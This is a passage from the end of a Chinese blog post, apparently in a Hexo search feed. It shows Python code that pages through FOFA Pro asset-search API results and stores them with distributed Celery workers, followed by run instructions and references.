fields_str = <span class="string">','</span>.join(fields)</span><br><span class="line">    api_url = <span class="string">'http://fofa.so/api/v1/search/all?email='</span>+fofa_name+<span class="string">'&amp;key='</span>+fofa_key+<span class="string">'&amp;fields='</span>+fields_str+<span class="string">'&amp;size='</span>+str(page_size)+<span class="string">'&amp;page='</span>+str(page_start)+<span class="string">'&amp;qbase64='</span>+base64_str</span><br><span class="line">    rs = fofa_requests(api_url)</span><br><span class="line">    total_size = rs[<span class="string">'size'</span>]</span><br><span class="line">    <span class="comment"># 计算页数</span></span><br><span class="line">    page_end = total_size / page_size + <span class="number">1</span> <span class="keyword">if</span> total_size % page_size != <span class="number">0</span> <span class="keyword">else</span> total_size / page_size</span><br><span class="line">    <span class="comment"># 存入数据库</span></span><br><span class="line">    batch_insert_db(rs[<span class="string">'results'</span>],fofa_sql)</span><br><span class="line">    <span class="keyword">for</span> page_no <span class="keyword">in</span> range(<span class="number">1</span>,page_end+<span class="number">1</span>):</span><br><span class="line">        api_url = <span class="string">'http://fofa.so/api/v1/search/all?email='</span>+fofa_name+<span class="string">'&amp;key='</span>+fofa_key+<span class="string">'&amp;fields='</span>+fields_str+<span class="string">'&amp;size='</span>+str(page_size)+<span class="string">'&amp;page='</span>+str(page_no)+<span class="string">'&amp;qbase64='</span>+base64_str</span><br><span class="line">        logging.info(<span class="string">'send task --&gt;'</span>+api_url)</span><br><span class="line">        celery_spider.delay(api_url,fofa_sql)</span><br></pre></td></tr></table></figure><p>完整代码地址：<a href="https://github.com/0nise/scripts/blob/master/fofa_spider_ext.py" target="_blank" rel="noopener">https://github.com/0nise/scripts/blob/master/fofa_spider_ext.py</a></p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul><li>运行<code>python fofa_spider_ext.py</code>发送需要爬虫的任务信息</li><li>运行<code>celery -A fofa_spider_ext worker -l info</code> 进行消费爬虫</li></ul><p>运行成功</p><p><img src="/posts/f5ba6079/WX20190301-220619@2x.png" alt="celery运行成功"></p><p>数据库信息</p><p><img src="/posts/f5ba6079/WX20190301-220757@2x.png" alt="数据库存入数据"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://www.cnblogs.com/forward-wang/p/5970806.html" target="_blank" rel="noopener">Celery 框架学习笔记</a></li><li><a href="https://www.cnblogs.com/yuhangwang/p/5817930.html" target="_blank" rel="noopener">Redis入门详解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> FOFA Pro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FOFA Pro </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
